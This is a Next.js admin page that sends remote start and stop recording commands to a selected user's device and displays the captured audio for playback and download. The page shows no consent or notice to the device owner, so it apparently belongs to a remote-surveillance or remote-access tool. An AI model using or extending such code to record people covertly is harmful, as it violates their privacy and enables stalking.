'use client';
import { useEffect, useState, useCallback, useRef } from 'react';
import { useParams, useRouter } from 'next/navigation';
import { ArrowLeft, Mic, Loader, CheckCircle, Download, Clock, RefreshCw, Wifi, WifiOff } from 'lucide-react';
import { adminApi } from '@/lib/adminApi';
import PageLoader from '@/components/PageLoader';

interface Cmd { id: string; commandType: string; status: string; result: string | null; issuedAt: string; completedAt: string | null; }
interface DeviceInfo { deviceId: string; name: string; isOnline: boolean; }

function parseResult(raw: string | null) { if (!raw) return null; try { return JSON.parse(raw); } catch { return null; } }
function fmtTime(s: string) { return new Date(s).toLocaleString('en-IN', { dateStyle: 'short', timeStyle: 'medium' }); }

const STATUS: Record<string, { label: string; color: string; dot: string }> = {
  pending:   { label: 'Waiting…',  color: 'text-yellow-400', dot: 'bg-yellow-400 animate-pulse' },
  delivered: { label: 'Delivered', color: 'text-blue-400',   dot: 'bg-blue-400 animate-pulse' },
  executing: { label: 'Running…',  color: 'text-indigo-400', dot: 'bg-indigo-400 animate-pulse' },
  completed: { label: 'Done',      color: 'text-green-400',  dot: 'bg-green-400' },
  failed:    { label: 'Failed',    color: 'text-red-400',    dot: 'bg-red-500' },
};

function AudioCard({ cmd }: { cmd: Cmd }) {
  const result = parseResult(cmd.result);
  const st = STATUS[cmd.status] ?? STATUS.pending;
  const isPending = ['pending','delivered','executing'].includes(cmd.status);
  return (
    <div className="bg-gray-900 border border-gray-800 rounded-2xl overflow-hidden">
      <div className="flex items-center justify-between px-4 py-3 border-b border-gray-800">
        <div className="flex items-center gap-2">
          <Mic size={14} className="text-red-400" />
          <span className="text-white text-xs font-semibold capitalize">{cmd.commandType.replace(/_/g,' ')}</span>
        </div>
        <div className="flex items-center gap-2">
          <span className={`w-2 h-2 rounded-full ${st.dot}`} />
          <span className={`text-xs font-medium ${st.color}`}>{st.label}</span>
        </div>
      </div>
      {result?.type === 'audio' && result.data ? (
        <div className="p-4 space-y-3">
          <audio controls src={`data:${result.mimeType ?? 'audio/mp4'};base64,${result.data}`} className="w-full" />
          <div className="flex items-center justify-between text-xs text-gray-500">
            {result.duration != null && <span><Clock size={11} className="inline mr-1" />{result.duration}s</span>}
            <a href={`data:${result.mimeType ?? 'audio/mp4'};base64,${result.data}`} download={`audio_${cmd.id.slice(0,8)}.m4a`}
              className="flex items-center gap-1 text-indigo-400 hover:text-indigo-300">
              <Download size={11} /> Download
            </a>
          </div>
        </div>
      ) : result?.type === 'status' ? (
        <div className="flex items-center gap-2 px-4 py-4 text-green-400 text-sm">
          <CheckCircle size={14} /> {String(result.message)}
        </div>
      ) : isPending ? (
        <div className="flex items-center gap-3 px-4 py-6 text-gray-500 text-sm">
          <div className="w-7 h-7 border-4 border-red-900 border-t-red-500 rounded-full animate-spin flex-shrink-0" />
          Waiting for device…
        </div>
      ) : (
        <div className="px-4 py-4 text-gray-600 text-sm">{cmd.result ?? 'No result'}</div>
      )}
      <div className="px-4 py-2 text-gray-600 text-xs border-t border-gray-800">{fmtTime(cmd.issuedAt)}</div>
    </div>
  );
}

export default function AdminRemoteAudioPage() {
  const { userId, deviceId } = useParams<{ userId: string; deviceId: string }>();
  const router = useRouter();
  const [device, setDevice] = useState<DeviceInfo | null>(null);
  const [commands, setCommands] = useState<Cmd[]>([]);
  const [busy, setBusy] = useState<string | null>(null);
  const [loading, setLoading] = useState(true);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  useEffect(() => {
    adminApi.userDetail(userId).then((r) => {
      setDevice(r.data.devices?.find((d: DeviceInfo) => d.deviceId === deviceId) ?? null);
    }).catch(() => {});
  }, [userId, deviceId]);

  const fetchCmds = useCallback(async () => {
    try {
      const r = await adminApi.deviceCommands(deviceId);
      setCommands((r.data as Cmd[]).filter((c) =>
        ['start_mic','stop_mic','start_recording','stop_recording'].includes(c.commandType)));
    } catch {}
  }, [deviceId]);

  useEffect(() => {
    setLoading(true);
    fetchCmds().finally(() => setLoading(false));
    pollRef.current = setInterval(fetchCmds, 2000);
    return () => { if (pollRef.current) clearInterval(pollRef.current); };
  }, [fetchCmds]);

  async function send(type: string) {
    setBusy(type);
    try { await adminApi.issueCommand(deviceId, type); await fetchCmds(); }
    finally { setBusy(null); }
  }

  return (
    <div className="flex-1 flex flex-col min-h-0">
      <div className="px-8 pt-8 pb-5 border-b border-gray-800">
        <button onClick={() => router.push(`/admin/users/${userId}/remote/${deviceId}`)}
          className="flex items-center gap-2 text-gray-400 hover:text-white text-sm mb-4 transition-colors">
          <ArrowLeft size={15} /> Remote Access
        </button>
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-red-500/20 rounded-xl flex items-center justify-center">
              <Mic size={20} className="text-red-400" />
            </div>
            <div>
              <h1 className="text-xl font-extrabold text-white">Audio Recording</h1>
              <div className="flex items-center gap-2 mt-0.5">
                <span className="text-gray-400 text-sm">{device?.name ?? deviceId}</span>
                {device?.isOnline
                  ? <span className="flex items-center gap-1 text-green-400 text-xs"><Wifi size={11} /> Live</span>
                  : <span className="flex items-center gap-1 text-gray-500 text-xs"><WifiOff size={11} /> Offline</span>}
              </div>
            </div>
          </div>
          <button onClick={fetchCmds} className="text-gray-600 hover:text-gray-300 transition-colors">
            <RefreshCw size={15} />
          </button>
        </div>
      </div>
      <div className="flex-1 overflow-y-auto p-8 space-y-6">
        <div className="flex gap-3 flex-wrap">
          {[
            { label: '🎙 Start Recording', cmd: 'start_recording', color: 'bg-red-600 hover:bg-red-700' },
            { label: '⏹ Stop & Save',      cmd: 'stop_recording',  color: 'bg-gray-700 hover:bg-gray-600' },
          ].map((btn) => (
            <button key={btn.cmd} onClick={() => send(btn.cmd)} disabled={!!busy}
              className={`flex items-center gap-2 px-5 py-3 rounded-2xl text-white font-bold text-sm transition-all active:scale-95 disabled:opacity-60 shadow-lg ${btn.color}`}>
              {busy === btn.cmd ? <Loader size={16} className="animate-spin" /> : <Mic size={16} />}
              {btn.label}
            </button>
          ))}
        </div>
        <div className="bg-gray-900 border border-gray-800 rounded-xl px-4 py-3 text-xs text-gray-500">
          <strong className="text-gray-400">How to record:</strong> Send "Start Recording" → wait ~1 min → send "Stop &amp; Save" → audio appears below.
        </div>
        {loading ? <PageLoader theme="dark" /> : commands.length === 0 ? (
          <div className="text-center py-16 text-gray-600"><Mic size={40} className="mx-auto mb-3 opacity-20" /><p>No recordings yet.</p></div>
        ) : (
          <div className="space-y-4">{commands.map((cmd) => <AudioCard key={cmd.id} cmd={cmd} />)}</div>
        )}
      </div>
    </div>
  );
}
